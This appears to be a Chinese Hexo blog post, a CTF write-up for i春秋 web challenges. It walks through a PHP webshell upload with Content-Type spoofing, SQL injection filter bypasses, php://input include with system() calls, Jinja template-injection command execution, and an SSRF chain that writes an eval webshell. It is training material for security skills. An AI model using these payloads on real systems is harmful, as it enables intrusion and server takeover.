@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>i春秋CTF | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WEB1. broken题目链接：http:&#x2F;&#x2F;106.75.72.168:1111&#x2F; 进入链接看到一串代码，目测是jsfuck。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="i春秋CTF">
+<meta property="og:url" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEB1. broken题目链接：http:&#x2F;&#x2F;106.75.72.168:1111&#x2F; 进入链接看到一串代码，目测是jsfuck。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/12.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/13.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/14.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/15.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/16.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/17.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/18.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/19.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/20.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/21.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/22.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/23.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/24.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/25.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/26.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/27.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/28.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/29.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/30.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/31.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/32.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/33.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/35.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/36.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/37.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/38.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/39.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/40.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/41.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/42.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/43.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/44.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/45.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/46.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/47.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/48.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/49.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/50.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/51.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/52.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/53.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/54.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/55.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/56.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/57.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/58.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/59.png">
+<meta property="article:published_time" content="2018-09-06T10:48:38.000Z">
+<meta property="article:modified_time" content="2019-12-30T10:31:51.369Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/i%E6%98%A5%E7%A7%8BCTF/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-i春秋CTF" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/06/i%E6%98%A5%E7%A7%8BCTF/" class="article-date">
+  <time datetime="2018-09-06T10:48:38.000Z" itemprop="datePublished">2018-09-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      i春秋CTF
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-broken"><a href="#1-broken" class="headerlink" title="1. broken"></a>1. broken</h3><p>题目链接：<a href="http://106.75.72.168:1111/" target="_blank" rel="noopener" title="broken">http://106.75.72.168:1111/</a></p>
+<p>进入链接看到一串代码，目测是jsfuck。</p>
+<a id="more"></a>
+<p>代码太多，这里就不放出来了</p>
+<p>打开浏览器，按F12，把代码放到console里面跑一下报错了，联想到题目给的broken想到有可能是代码不全，经过观察发现第一个[括号没有对应的右括号，在末尾加上一个右括号，再把结尾的()去掉<br>直接得到一个Array:<code>Array [ &quot;var flag=\&quot;flag{f_f_l_u_a_c_g_k}\&quot;;alert(&#39;flag is not here&#39;);&quot; ]</code></p>
+<p><img src="i春秋CTF/1.png" alt=""></p>
+<h3 id="2-Do-you-know-upload？"><a href="#2-Do-you-know-upload？" class="headerlink" title="2. Do you know upload？"></a>2. Do you know upload？</h3><p>根据题目推测是文件上传，先上传一个jpg显示上传成功，上传一个php显示上传失败，那么写一个一句话木马放到php文件里。<img src="i春秋CTF/2.png" alt=""><br>上传的时候用burpsuite抓个包然后把Content-Type字段改成image/jpeg<br>提示上传成功，并给出了路径<img src="i春秋CTF/3.png" alt=""><br><img src="i春秋CTF/4.png" alt=""></p>
+<p>菜刀连上之后并没有找到flag文件，推测是不是在ctf数据库里面，那么看一下数据库配置文件config.php，看到了数据库账号密码<br><img src="i春秋CTF/5.png" alt=""><br>编辑菜刀连接数据库上去拿到flag<br><img src="i春秋CTF/6.png" alt=""><br><img src="i春秋CTF/7.png" alt=""></p>
+<h3 id="3-wanna-to-see-your-hat"><a href="#3-wanna-to-see-your-hat" class="headerlink" title="3.wanna to see your hat?"></a>3.wanna to see your hat?</h3><p>题目地址：<code>http://120.132.56.20:1515/</code><br>进入题目后是一堆帽子，往下拉有一个链接<code>I want to check the color of my hat!</code></p>
+<p>点进去这个链接发现有一个提交框</p>
+<p><img src="i春秋CTF/8.png" alt=""></p>
+<p>随便输一个提交进去发现页面直接跳转了，跳转到的那个页面又是一堆帽子，没什么意义。</p>
+<p>那么这道题的关键应该就在这个提交框了，回到<code>http://120.132.56.20:1515/route.php?act=login</code>页面</p>
+<p>为了防止页面跳转，我们用抓包来抓取页面</p>
+<p>抓取到的页面和网页的回应如下</p>
+<p><img src="i春秋CTF/9.png" alt=""></p>
+<p>从网页的返回可以看到一行sql语句，初步判定这道题用的应该是sql注入，然后我们在name字段随便输入一个值，后边加上单引号，可以看到页面返回如下。</p>
+<p><img src="i春秋CTF/10.png" alt=""></p>
+<p>通过分析我们发现页面把我们输入的单引号替换成了反斜杠，那么我们如果在末尾加上了单引号原本sql语句末的单引号就被转移掉了，通过测试和分析发现空格也被过滤掉了，这里脑部一下在sql语句中注释符是可以代替空格的，这里就用<code>/**/</code>来代替空格，最后总结出来payload:<code>or/**/1#1&#39;</code></p>
+<p>页面返回如下</p>
+<p><img src="i春秋CTF/11.png" alt=""></p>
+<p>我们来分析一下下面这个sql语句真正执行的是什么：</p>
+<pre><code>select count(*) from t_info where username = &apos;or/**/1#1\&apos; or nickname = &apos;or/**/1#1\&apos;
+</code></pre><p>首先第一个单引号从 <strong>username =</strong> 的后边一直到 <strong>nickname = </strong> 的后边，两个单引号中间虽然还有个单引号<code>1\&#39;</code>，但是这个单引号左边有一个反斜杠，被反斜杠转义了之后就失去了单引号的意义，所以可以认为它不是个单引号。那么两个单引号之间的内容其实都是username的值，而至于语句的最后边<code>#1\&#39;</code>，在sql语句中#代表注释符，#后边的内容都被注释掉了，我们就直接当作后边没有东西，而/*<em>/在sql语句中是注释符，其实就等价于空格，那么这个sql语句整理一下就是这样：<br>    select count(</em>) from t_info where username = ‘A’ or 1</p>
+<p>语句的后边or 1 永远为真，所以可以直接登陆成功。</p>
+<p>然后拿着payload放到网站的登陆框内，点击提交，</p>
+<p><img src="i春秋CTF/12.png" alt=""></p>
+<p>得到flag.</p>
+<p><img src="i春秋CTF/13.png" alt=""></p>
+<h3 id="4-upload"><a href="#4-upload" class="headerlink" title="4.upload"></a>4.upload</h3><p>进去之后显示：<code>Hi,CTFer!u should be a fast man:)</code></p>
+<p>按F12查看网络发现请求头里有个flag字段是base64编码的，那么拿出来对其解码得到一个数，然后我们查看页面的源代码发现有一句话：<code>Please post ichunqiu what you find</code><br>那么我们Post这个参数<code>ichunqiu=前边解码得到的字符串</code><br>然后页面返回<code>Hi,CTFer!u should be a fast man:)</code></p>
+<p>那么上脚本：<br>    import requests<br>    import base64<br>    a = requests.session()<br>    b = a.get(“<a href="http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com//&quot;" target="_blank" rel="noopener">http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com//&quot;</a>)<br>    key1 = b.headers[“flag”]<br>    c = base64.b64decode(key1)<br>    d = str(c).split(‘:’)<br>    key = base64.b64decode(d[1])<br>    body = {“ichunqiu”:key}<br>    f = a.post(“<a href="http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/&quot;,data=body" target="_blank" rel="noopener">http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/&quot;,data=body</a>)<br>    print(f.text)</p>
+<p>得到结果：<br>    Path:3712901a08bb58557943ca31f3487b7d</p>
+<p>访问地址：<code>http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/3712901a08bb58557943ca31f3487b7d</code></p>
+<p>我们对目录扫描发现有一个/.svn  有可能是源码泄露，然后对<code>http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/.svn</code>进行目录扫描发现下边有一个wc.db文件，访问一下看到一句话：<code>my username is md5(HEL1OW1OrDEveryOn3)</code><br>将这句话md5加密一下：<code>8638d5263ab0d3face193725c23ce095</code></p>
+<p>然后我们进入登陆页面：<br>password=123456<br>下边还有这句话：<br>    substr(md5(captcha), 0, 6)=da6137</p>
+<p>上脚本，爆破验证码：<br>    import hashlib<br>    def md5(s):<br>        return hashlib.md5(str(s).encode(‘utf-8’)).hexdigest()<br>    def main(s):<br>        for i in range(1,99999999):<br>            if md5(i)[0:6]  == str(s):<br>                print(i)<br>                exit(0)<br>    if <strong>name</strong> == ‘<strong>main</strong>‘:<br>        main(“e34002”)</p>
+<p>获得验证码后点击submit得到这句话<br>    The 7815696ecbf1c96e6894b779456d330e.php:) Welcome 8638d5263ab0d3face193725c23ce095!<br>然后访问url：<code>http://8913d6c422814e9a83f85cbfe9d35387fa36a0b37d934e25.game.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php</code></p>
+<p>进入到一个文件上传的页面，经典的文件上传漏洞，上传一个jpg图片，打开burp suite抓个包将文件名后缀改成pht即可得到flag.</p>
+<h3 id="5-include"><a href="#5-include" class="headerlink" title="5.include"></a>5.include</h3><p>题目内容：没错！就是文件包含漏洞</p>
+<p>进去后看到一串代码：</p>
+<pre><code>&lt;?php 
+show_source(__FILE__);
+if(isset($_REQUEST[&apos;path&apos;])){
+    include($_REQUEST[&apos;path&apos;]);
+}else{
+    include(&apos;phpinfo.php&apos;);
+}
+</code></pre><p>通过代码审计发现可以传入一个参数path，里面的填入的文件路径可以访问，<br>那么试一试传入<code>?path=flag.php</code> 看能不能得到flag 但是发现并不行<br>刚开始没什么头绪，后来想到能不能试一试为协议呢：<br>于是传入参数：<code>?path=php://input</code><br>然后post里面传入一个一句话：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></p>
+<p><img src="i春秋CTF/14.png" alt=""></p>
+<p>然后访问之后就会看到</p>
+<p><img src="i春秋CTF/15.png" alt=""></p>
+<p>当前路径下有三个文件，然后我们访问一下第一个最有可能的文件：</p>
+<p>利用burpsuite抓包</p>
+<p>仍然利用之前的payload  get传入<code>?path=php://input</code></p>
+<p>post传入<code>&lt;?php system(&#39;cat dle345aae.php&#39;); ?&gt;</code></p>
+<p><img src="i春秋CTF/16.png" alt=""></p>
+<p>然后得到页面返回的flag</p>
+<p><img src="i春秋CTF/17.png" alt=""></p>
+<h3 id="6-攻击"><a href="#6-攻击" class="headerlink" title="6.攻击"></a>6.攻击</h3><p>题目内容：一个ip只有一个机会，哈哈哈。</p>
+<p>进去后就给了源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">echo &#39;&lt;pre&gt;&#39;;</span><br><span class="line">include(&#39;u&#x2F;ip.php&#39;);</span><br><span class="line">include(&#39;flag.php&#39;);</span><br><span class="line">if (in_array($_SERVER[&#39;REMOTE_ADDR&#39;],$ip))&#123;</span><br><span class="line">  die(&quot;您的ip已进入系统黑名单&quot;);</span><br><span class="line">&#125;</span><br><span class="line">var_dump($ip);</span><br><span class="line"></span><br><span class="line">if ($_POST[substr($flag,5,3)]&#x3D;&#x3D;&#39;attack&#39;)&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;else if (count($_POST)&gt;0)&#123;</span><br><span class="line">  $ip &#x3D; &#39;$ip[]&#x3D;&quot;&#39;.$_SERVER[&#39;REMOTE_ADDR&#39;].&#39;&quot;;&#39;.PHP_EOL; </span><br><span class="line">  file_put_contents(&#39;u&#x2F;ip.php&#39;,$ip,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;&#x2F;pre&gt;&#39;;</span><br></pre></td></tr></table></figure></p>
+<p>代码审计可知：<br>(1)若当前IP与$ip变量的内容相同，则提示信息直接退出。</p>
+<p>(2)当POST中某id的键值等于’attack’时，打印$flag。这个id为$flag的第五个位置开始，长度为3的一个字符串。</p>
+<p>(3)如果不满足(2)，则检查POST的变量个数，大于0则把你当前的IP加入到黑名单中（故一个IP只能攻击一次，失败了就要重新创建题目）</p>
+<p>tips：其实这里用python脚本也可以添加代理，这样如果IP被添加到黑名单的话也不用非要重新创建赛题</p>
+<p>直接献上代码：</p>
+<pre><code>import requests 
+a = &quot;1234567890&quot; 
+data = {} 
+for i in a: 
+    for j in a: 
+        for k in a: 
+            data[i+j+k]=&quot;attack&quot; 
+print(data) 
+r=requests.post(&quot;http://http://af607c7697f54098938c60906d7323ad38823a770723442c.game.ichunqiu.com/&quot;,data=data) 
+print(r.text)
+</code></pre><p>运行即可得到flag</p>
+<h3 id="7-Fuzz"><a href="#7-Fuzz" class="headerlink" title="7.Fuzz"></a>7.Fuzz</h3><p>利用模糊测试得到参数是name<br>输入?name=test<br>得到<code>Hello test</code></p>
+<p>先给出payload:</p>
+<pre><code>name=%7B%7B &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/owned.cfg&apos;, &apos;w&apos;).write(&apos;from subprocess import check_output\n\nRUNCMD = check_output\n&apos;) %7D%7D
+
+
+name=%7B%7B config.from_pyfile(&apos;/tmp/owned.cfg&apos;) %7D%7D 
+
+
+name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
+
+name=%7B%7B%20config[%27RUNCMD%27](%27echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py%27,shell=True)%20%7D%7D
+
+name=%7B%7B%20config[%27RUNCMD%27](%27python /tmp/get.py%27,shell=True)%20%7D%7D
+</code></pre><p>还没弄懂什么意思  后边再来解释</p>
+<h3 id="8-Look"><a href="#8-Look" class="headerlink" title="8.Look"></a>8.Look</h3><p>题目内容：我看的见你，你却看不见我。（非隐写）<br>还给了两个提示：</p>
+<pre><code>tips：sql injection
+tips2: mysql 字符集
+</code></pre><p>挺有趣的一道题，注入+getshell<br>进入题目一片空白，查看源代码还是那样<br>看一看请求头发现一个有用的东西</p>
+<p><code>X-HT:VERIFY</code></p>
+<p><img src="i春秋CTF/18.png" alt=""></p>
+<p>提示上说事SQL注入，那么注入用的参数可能就是这个字段，那么我们来试一试：</p>
+<pre><code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/?verify=adm
+</code></pre><p>页面返回：<code>verify error</code><br>说明我们的参数还是有效果的，我的习惯是先试一试万能密码：<code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/?verify=&#39;=0%23</code><br>页面返回了一个文件：<br>    next page 5211ec9dde53ee65bb02225117fba1e1.php</p>
+<p>那么我们来访问它一下：<code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/5211ec9dde53ee65bb02225117fba1e1.php</code></p>
+<p>页面返回只有一个hello，根据刚才的经验，直接查看请求头看看：</p>
+<p><img src="i春秋CTF/19.png" alt=""></p>
+<p>看到viminfo想到是不是vim备份文件，那么访问一下:</p>
+<p><code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/.viminfo</code><br>看到了有用的东西：</p>
+<p><img src="i春秋CTF/20.png" alt=""><br>那么访问一下这个备份文件：<br>    <a href="http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/icq/" target="_blank" rel="noopener">http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/icq/</a></p>
+<p>看到了两行的php代码<br><img src="i春秋CTF/21.png" alt=""></p>
+<p>查看一下页面的源代码：<br>看到了完整的php代码：</p>
+<pre><code>&lt;?php
+$con = mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;&apos;);
+mysql_query(&quot;set names utf8&quot;);
+mysql_select_db(&quot;ctf&quot;);
+if($_SERVER[&quot;REMOTE_ADDR&quot;]==&apos;8.8.8.8&apos;){
+    $name = addslashes($_GET[&apos;usern3me&apos;]);
+}
+else{
+    if(stripos($_GET[&apos;usern3me&apos;],&apos;Bctf2O16&apos;)!==false){
+        $name = &apos;FUCK&apos;;
+    }
+    else{
+        $name = addslashes($_GET[&apos;usern3me&apos;]);
+    }
+}
+echo &apos;hello &apos;.$name;
+$sql = &quot;select * from admin where name=&apos;$name&apos;&quot;;
+$result = mysql_query($sql);
+$num = mysql_num_rows($result);
+if($num&gt;0){
+    echo &apos;&lt;br&gt;next ***.php&apos;;
+}
+?&gt;
+</code></pre><p>代码审计可以发现，其实就是要查询Bctf2O16，但是又不能出现这个字符串，根据提示想到mysql字符集<br>于是构造出payload:<br><code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=B%C3%87tf2O16</code></p>
+<p>页面返回<br>    hello BÇtf2O16 next c3368f5eb5f8367fd548b228bee69ef2.php</p>
+<p>那么继续查看这个文件<br>    <a href="http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/c3368f5eb5f8367fd548b228bee69ef2.php" target="_blank" rel="noopener">http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/c3368f5eb5f8367fd548b228bee69ef2.php</a></p>
+<p>页面返回了一个php代码：</p>
+<pre><code>&lt;?php
+if(isset($_GET[&apos;path&apos;]) &amp;&amp; isset($_GET[&apos;filename&apos;])){
+    $path = $_GET[&apos;path&apos;];
+    $name = &quot;upload/&quot;.$_GET[&apos;filename&apos;];
+}
+else{
+    show_source(__FILE__);
+    exit();
+}
+if(strpos($name,&apos;..&apos;) &gt; -1){
+    echo &apos;WTF&apos;;
+    exit();
+}
+
+if(strpos($path,&apos;http://127.0.0.1/&apos;) === 0){
+    file_put_contents($name,file_get_contents($path));
+}
+else{
+    echo &apos;path error&apos;;
+}
+?&gt;
+</code></pre><p>还要代码审计，需要传入一个path变量，里面要有<code>http://127.0.0.1/</code>这个字段，那么我们用url来写入一个一句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com&#x2F;c3368f5eb5f8367fd548b228bee69ef2.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;5211ec9dde53ee65bb02225117fba1e1.php?usern3me&#x3D;&lt;?php%2520eval($_POST[c]);?&gt;&amp;filename&#x3D;b.php</span><br></pre></td></tr></table></figure></p>
+<p>访问之后就生成了一个一句话木马，路径就是<code>/upload/bag.php</code><br>上菜刀了，路径是<code>http://4a3416333d9544e9bbc41478dc5602d072d55777f2564419.game.ichunqiu.com/upload/b.php</code><br>密码就是:c</p>
+<p><img src="i春秋CTF/22.png" alt=""></p>
+<p>菜刀连上之后<br>查看一下当前目录下的文件：<br>什么都没有，那么返回到上一个目录，再查看一下有什么文件：</p>
+<p><img src="i春秋CTF/23.png" alt=""></p>
+<p>终于得到了想要的，<code>cat flag_is_here.php</code><br>就有flag了</p>
+<p><img src="i春秋CTF/24.png" alt=""></p>
+<h3 id="9-upload"><a href="#9-upload" class="headerlink" title="9. upload"></a>9. upload</h3><blockquote>
+<p>想怎么传就怎么传，就是这么任性<br>hint:肯定是文件上传了</p>
+</blockquote>
